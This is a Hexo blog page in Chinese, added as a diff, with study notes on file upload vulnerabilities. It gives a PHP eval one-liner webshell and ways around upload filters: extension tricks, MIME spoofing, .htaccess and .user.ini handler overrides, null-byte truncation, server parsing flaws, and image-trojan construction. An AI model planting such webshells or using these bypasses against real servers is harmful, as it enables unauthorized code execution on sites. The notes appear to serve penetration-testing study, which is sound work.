@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>文件上传漏洞 | w1t2f3&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="http://example.com/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="w1t2f3&#39;s blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/muma.jpg">
+<meta property="article:published_time" content="2023-10-24T12:15:49.435Z">
+<meta property="article:modified_time" content="2023-10-24T12:18:08.547Z">
+<meta property="article:author" content="w1t2f3">
+<meta property="article:tag" content="技术基础">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/muma.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="w1t2f3's blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">w1t2f3&#39;s blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-文件上传漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2023-10-24T12:15:49.435Z" itemprop="datePublished">2023-10-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      文件上传漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <img src="/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/muma.jpg" class title="图片">
+
+<span id="more"></span>
+
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="0-1-一句话木马的使用"><a href="#0-1-一句话木马的使用" class="headerlink" title="0.1 一句话木马的使用"></a>0.1 一句话木马的使用</h2><p><code>&lt;?php eval($_POST[&#39;pass&#39;])?&gt;</code></p>
+<p>传入成功后可以用中国菜刀或者蚁剑连接，</p>
+<p>测试可用<code>&lt;?php phpinfo();?&gt;</code></p>
+<h2 id="1-1-前端拦截"><a href="#1-1-前端拦截" class="headerlink" title="1.1 前端拦截"></a>1.1 前端拦截</h2><p>关闭浏览器javascript功能后上传即可</p>
+<h2 id="1-2-MIME文件类型拦截"><a href="#1-2-MIME文件类型拦截" class="headerlink" title="1.2 MIME文件类型拦截"></a>1.2 MIME文件类型拦截</h2><p>用bp抓包，将Content-Type后内容改为image&#x2F;jpeg</p>
+<p>即<code>Content-Type: image/jpeg</code></p>
+<h2 id="1-3-关键字黑名单拦截"><a href="#1-3-关键字黑名单拦截" class="headerlink" title="1.3 关键字黑名单拦截"></a>1.3 关键字黑名单拦截</h2><p>黑名单判断，凡是出现在黑名单的都不让过</p>
+<ul>
+<li>尝试更改同义后缀</li>
+</ul>
+<p>​	.php &#x3D;&gt; .php3 .php4 .php5 .pht .phtml </p>
+<ul>
+<li><p>大小写绕过</p>
+<p>.php &#x3D;&gt; .pHp</p>
+</li>
+<li><p>空格，点绕过</p>
+<p>.php &#x3D;&gt; .pHp. .</p>
+</li>
+<li><p>若是删除黑名单中的内容，双写绕过即可</p>
+</li>
+</ul>
+<h2 id="1-4-图片内容检测绕过"><a href="#1-4-图片内容检测绕过" class="headerlink" title="1.4 图片内容检测绕过"></a>1.4 图片内容检测绕过</h2><ul>
+<li><p>.htassess绕过</p>
+<p><code>&lt;FilesMatch “xx”&gt;SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></p>
+</li>
+<li><p>.user.ini绕过</p>
+<p> <code>auto_prepend_file=xx.jpg </code></p>
+</li>
+<li><p>二次渲染</p>
+<p>对一个图片渲染，然后对比那些地方不会修改，将木马写入</p>
+</li>
+</ul>
+<h2 id="1-5-白名单检测绕过"><a href="#1-5-白名单检测绕过" class="headerlink" title="1.5 白名单检测绕过"></a>1.5 白名单检测绕过</h2><p>加入截断字符xx.php%00.jpg</p>
+<p>POST包中将%00进行urldecode</p>
+<h2 id="1-6-截断上传绕过"><a href="#1-6-截断上传绕过" class="headerlink" title="1.6 截断上传绕过"></a>1.6 截断上传绕过</h2><p>IIS6&#x2F;7&#x2F;7.5解析漏洞，nginx低版本解析漏洞</p>
+<p><code>IIS 5.x/6.0 test.asp/1.jpg muma.asp;.jpg IIS xxx/1.jpg/1.php</code></p>
+<p>nginx低版本解析漏洞</p>
+<p><code>Nginx xxx/1.jpg/1.php xxx/1.jpg%00php xxx/1.jpg%20%00php%20 ⇒ xxx/1.jpg \0php</code></p>
+<p>Apache </p>
+<p><code>1.php.jpg.png</code>从后面向前只有php可以被解析</p>
+<h2 id="1-7-压缩绕过"><a href="#1-7-压缩绕过" class="headerlink" title="1.7 压缩绕过"></a>1.7 压缩绕过</h2><p>php发现.7z .zip .rar .gz压缩文件，会自动解压执行</p>
+<p>x.php.7z可以当做php执行</p>
+<h2 id="2-1-1-图片木马"><a href="#2-1-1-图片木马" class="headerlink" title="2.1.1 图片木马"></a>2.1.1 图片木马</h2><p>图片木马必须配合文件包含使用<br><code>http://127.0.0.1/include.php?file=upload/muma.jpg</code></p>
+<h2 id="2-1-2-图片木马制作"><a href="#2-1-2-图片木马制作" class="headerlink" title="2.1.2 图片木马制作"></a>2.1.2 图片木马制作</h2><p><em>法一：</em></p>
+<p>windows cmd<br><code>copy tu.jpg /b+muma.php /a 2.jpg</code></p>
+<p>linux<br><code>cat tu.jpg muma.php &gt; 2.jpg</code></p>
+<p><em>法二：</em><br>GIF89a<br><?php phpinfo();?><br>保存为gif格式</p>
+<p> <em>法三：</em></p>
+<p>使用c32软件，打开图片拉到最下面，把木马的代码复制进去</p>
+<h2 id="2-1-3-二次渲染绕过"><a href="#2-1-3-二次渲染绕过" class="headerlink" title="2.1.3 二次渲染绕过"></a>2.1.3 二次渲染绕过</h2><p>不推荐使用png和jpg，使用gif</p>
+<p>制作一个gif图，丢进去看看渲染了什么地方没有变，把一句话木马放在那个地方</p>
+<p>同样使用c32</p>
+<h2 id="3-1-bp爆破"><a href="#3-1-bp爆破" class="headerlink" title="3.1 bp爆破"></a>3.1 bp爆破</h2><p>若是先存放文件，然后看看是否合法，不合法删掉</p>
+<p>可以使用bp的intruder模块爆破</p>
+<p>bp抓包–右键—send to intruder–payload选择number，10000次，总有一次在的 Xp</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="clo4amik10000lwf13zzchvxl" data-title="文件上传漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" rel="tag">技术基础</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/10/21/sql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">SQL注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" rel="tag">技术基础</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">技术基础</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/21/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/17/haha/">haha</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/17/A-Test/">A Test</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/17/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 w1t2f3<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
